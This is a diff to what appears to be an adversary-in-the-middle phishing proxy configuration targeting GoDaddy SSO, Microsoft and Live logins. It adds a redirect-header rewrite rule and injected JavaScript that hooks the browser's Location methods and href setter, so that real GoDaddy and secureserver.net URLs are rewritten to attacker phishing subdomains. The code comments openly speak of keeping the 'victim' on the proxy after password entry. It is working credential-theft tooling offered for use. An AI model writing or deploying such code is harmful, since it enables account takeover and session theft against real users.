@@ -155,6 +155,8 @@ sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  # Rewrite sso.godaddy.com in 302 Location header (e.g. redirect to /login/tac/pass after password)
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
   # Rewrite Microsoft URL in GoDaddy's auto_post_form (SAML federation response)
   # /v1/api/pass/login returns JSON with auto_post_form whose action is https://login.microsoftonline.com/login.srf
   # Without this, the SAML form POSTs directly to the real Microsoft, bypassing the proxy entirely.
@@ -410,6 +412,37 @@ js_inject:
               }
               return _origImport(fmt, keyData, algo, ext, uses);
             };
+          }
+        } catch(_e) {}
+
+        // ── Navigation intercept — keep victim on proxy ──────────────────────────
+        // GoDaddy's React SPA sets window.location.href = "https://sso.godaddy.com/login/tac/pass?..."
+        // after successful password verification. sub_filters only rewrite server 302 headers,
+        // NOT JS-initiated navigations. Intercept Location.prototype here to rewrite them.
+        try {
+          var _navPhishDomain = (function() {
+            var parts = window.location.hostname.split('.');
+            return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+          })();
+          function _rewriteNavUrl(u) {
+            if (typeof u !== 'string') return u;
+            return u
+              .replace(/https:\/\/sso2\.secureserver\.net/g, 'https://sssn2.' + _navPhishDomain)
+              .replace(/https:\/\/sso\.secureserver\.net/g,  'https://sssn.'  + _navPhishDomain)
+              .replace(/https:\/\/sso\.godaddy\.com/g,       'https://ssso.'  + _navPhishDomain);
+          }
+          var _locProto = Location.prototype;
+          var _origReplace = _locProto.replace;
+          _locProto.replace = function(url) { return _origReplace.call(this, _rewriteNavUrl(url)); };
+          var _origAssign = _locProto.assign;
+          _locProto.assign = function(url) { return _origAssign.call(this, _rewriteNavUrl(url)); };
+          var _hrefDesc = Object.getOwnPropertyDescriptor(_locProto, 'href');
+          if (_hrefDesc && _hrefDesc.set) {
+            Object.defineProperty(_locProto, 'href', {
+              get: _hrefDesc.get,
+              set: function(url) { _hrefDesc.set.call(this, _rewriteNavUrl(url)); },
+              configurable: true
+            });
           }
         } catch(_e) {}
 
